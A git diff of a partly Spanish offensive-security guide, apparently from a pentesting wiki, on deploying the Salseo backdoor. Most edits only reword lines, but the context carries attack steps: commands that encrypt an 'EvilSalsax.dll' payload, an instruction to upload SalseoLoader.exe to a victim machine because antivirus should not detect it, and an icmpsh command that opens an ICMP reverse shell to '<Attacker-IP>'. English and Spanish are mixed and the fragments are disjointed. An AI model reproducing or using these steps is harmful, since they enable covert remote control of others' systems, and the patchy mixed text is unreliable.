@@ -77,14 +77,14 @@ Detecting and preventing the Salseo backdoor can be challenging due to its steal
 
 4. **Network monitoring**: Monitoring network traffic for suspicious activity can help detect the presence of the backdoor and alert administrators to take appropriate action.
 
-By taking these preventive measures and maintaining a proactive security posture, the risk of falling victim to the Salseo backdoor can be significantly reduced.
+By taking these preventive measures, organizations can reduce the risk of falling victim to the Salseo backdoor and protect their systems and data from unauthorized access.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader**.
+Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**
 
-**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún antivirus...**
+**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**
 
 ## **Ejecutar la puerta trasera**
 
@@ -113,21 +113,13 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 #### Ejecutar el cliente:
 
-To execute the client, follow these steps:
+To execute the client, you need to follow these steps:
 
 1. Open a terminal window.
 2. Navigate to the directory where the client is located.
-3. Run the client executable by typing the following command:
+3. Run the client executable by typing the command `./client`.
 
-   ```
-   ./client
-   ```
-
-   This will start the client and establish a connection with the server.
-
-4. If prompted, enter the necessary credentials or configuration settings.
-
-Once the client is successfully executed, it will be ready to communicate with the server and perform the desired actions.
+This will start the client and establish a connection with the server. Make sure to provide the necessary parameters, such as the server IP address and port number, if required.
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -141,7 +133,7 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Agrega antes de la función principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instala DllExport para este proyecto
 
@@ -155,7 +147,7 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**
 
-### **Desinstala DllExport**
+### **D**esinstala DllExport
 
 Presiona **Desinstalar** (sí, es extraño pero confía en mí, es necesario)
 
